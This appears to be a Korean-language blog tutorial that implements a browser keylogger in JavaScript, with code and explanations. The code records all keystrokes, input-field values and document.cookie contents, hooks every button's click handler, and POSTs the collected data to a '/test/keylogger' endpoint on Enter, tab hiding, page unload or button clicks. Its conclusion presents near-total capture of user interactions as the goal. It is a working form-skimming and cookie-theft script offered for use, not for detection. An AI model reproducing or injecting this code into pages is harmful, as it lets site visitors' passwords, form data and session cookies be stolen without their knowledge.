<hr />

# Keylogger js 구현
> `javascript`로 `keylogger` 및 `쿠키 탈취`를 구현한다.

---

## 주요 기능 구상

1. 데이터 셋팅
    - 어떤 타입으로 왔는지
    - 버튼 이벤트 체크
    - 사용자가 타이핑 했던 값들
    - input 태그의 값들
    - 쿠키 값들
2. 타이핑 값 셋팅
3. 이벤트 발생 시 셋팅 데이터 발송
    - 엔터 이벤트
    - 화면이 안보일 때
    - 화면이 바뀌었을 때
    - 버튼을 눌렀을 때

---

## 1. 데이터 셋팅
>   - 어떤 타입으로 왔는지
>   - 버튼 이벤트 체크
>   - 사용자가 타이핑 했던 값들
>   - input 태그의 값들
>   - 쿠키 값들
---

```javascript
function setData(type, btnElement){
    const inputList = [];
    const inputs = document.querySelectorAll("input");
    inputs.forEach(i=>{
        const id = {
            "name" : i.name,
            "id" : i.id,
            "value" : i.value
        }
        inputList.push(id);
    });
    const buttonAttr = btnElement ? {"btnYn" : true} : {"btnYn" : false};

    if(btnElement){
        Array.from(btnElement.attributes).forEach(attr => {
            const key = attr.name;
            const value = attr.value;
            let processValue;

            if(btnElement[key] && typeof btnElement[key] === "function"){
                processValue = btnElement[key].toString();
            } else {
                processValue = value;
            }
            buttonAttr[key] = processValue;
        });
    }

    const cookies = document.cookie.split(";").map(cookie =>{
        const [key, value] = cookie.split("=");
        return {[key] : value};
    }).filter(cookie => cookie.key !== "" && typeof cookie.value !== "undefined");

    const req = {
        "type" : type,
        "inputList" : inputList,
        "keyData" : keyData,
        "cookies" : cookies,
        "btnYn" : buttonAttr
    }

    return req;
}
```
#### 설명
> - `input`태그들을 들고와서 for문으로 값들을 가지고와서 배열에 넣어둠
> - 버튼이 있다면 `true`, 없다면 `false` 셋팅
>   - 버튼이 있다면 `attributes`로 값을 list에 넣어서 for문 돌려서 값들을 빼냄
>   - 함수가 걸려 있다면 함수도 같이 집어 넣음
>   - 함수가 안걸려 있다면 그냥 value값을 집어 넣음
>   - 버튼의 `attribute`가 `key`가 되고 `value`를 `value`로 설정 후 배열에 넣어둠
> - `cookie`를 가지고와서 `key`,`value`로 분리 후에 배열에 집어 넣음
> - 모든 값을 `json`형태의 객채로 만들어서 `return` 시킴

---

## 2. 타이핑 값 셋팅

```javascript
    // 전역 변수설정
    let keyData ="";

    // 키로깅 함수
    function keylogging(e){
        if(e.code === "Enter" || e.code === "NumpadEnter"){
            sendData(null, "pressEnter");
        } else {
            keyData += e.key;
        }
    }

    window.onkeydown = (e) => keylogging(e);
```
#### 설명
> - `keyData` 전역 변수 설정
> - `keylogging`함수 생성
>   - `Enter` 누르거나 `NumpadEnter`누를 시에 데이터 전송 함수 실행
>   - 다른 키를 누른다면 전역 변수에 계속 누적

---

## 3. 이벤트 발생 시 셋팅 데이터 발송
>    - 엔터 이벤트
>    - 화면이 안보일 때
>    - 화면이 바뀌었을 때
>    - 버튼을 눌렀을 때

```javascript
// 화면이 안보일 때 발송
document.addEventListener("visibilitychange", ()=>{
    if(document.visibilityState === "hidden"){
        fetch("/test/keylogger", {
            method: "POST",
            headers: {
                "Content-Type": "application/json; charset=UTF-8"
            },
            body: JSON.stringify(setData("visibilitychange"))
        });
        keyData = '';
    }
});

// 화면이 변경 되면 발송
window.addEventListener("beforeunload", (e)=>{
    fetch("/test/keylogger", {
        method: "POST",
        headers: {
            "Content-Type": "application/json; charset=UTF-8"
        },
        body: JSON.stringify(setData("beforeunload"))
    });
});

// 버튼 클릭시 발송
window.onload = (()=>{
    let btns = document.querySelectorAll("button");
    btns.forEach(btn => {
        origin = btn.onclick===null ? (()=>{}) : btn.onclick.bind({});
        btn.onclick = () =>{
            sendData(btn, "btnSend");
            origin();
        }
    });
});
```
#### 설명
> - 문서에 화면이 `hidden` 상태(다른탭으로 이동 시)가 되면 `fetch`를 통해 비동기로 데이터 발송
> - 문서가 다른 화면으로 변경 시에 `fetch`를 통해 비동기로 데이터 발송
> - 버튼 클릭 시에 데이터 발송
>   - 기존의 버튼 이벤트는 문서 발송 이후에 실행 하도록 설정

---
## 결과 이미지
#### 화면이 안보일 때
![화면이 안보일 때](https://jeongmooon.github.io/img/report/keylogger/visibilitychange.png)

#### 화면이 바뀌었을 때
![화면이 바뀌었을 때](https://jeongmooon.github.io/img/report/keylogger/beforeunload.png)

#### 버튼을 눌렀을 때
![화면이 바뀌었을 때](https://jeongmooon.github.io/img/report/keylogger/btnSend.png)

---

## 결론
> 본 Keylogger 스크립트는 사용자의 입력, 버튼 클릭, 페이지 이동 등의 주요 이벤트를 감지하여 입력 데이터, 쿠키 정보 등을 실시간으로 수집하고 서버로 전송하는 기능을 구현하였다.
> - setData를 통해 수집된 데이터는 `fetch` API를 사용하여 비동기적으로 안전하게 서버로 전송된다.
> - 모든 전송은 `application/json; charset=UTF-8` 포맷으로 설정되어 있으며, 서버는 이를 JSON 형태로 받아 처리할 수 있다.
> - 주요 이벤트(타이핑, Enter, 탭 이동, 페이지 언로드, 버튼 클릭 등)를 포괄적으로 커버함으로써 실질적으로 거의 모든 사용자의 상호작용을 수집할 수 있다.
>
> 추가적으로, 서버와의 문자 인코딩 이슈(한글 깨짐 등)를 방지하기 위해 반드시 서버 측에서도 UTF-8 인코딩 설정을 일관되게 유지해야 한다.
> 최종적으로 본 스크립트는 다양한 상황에서도 데이터 누락 없이 사용자 행동 데이터를 안정적으로 수집하는 데 목적을 둔다.

<hr />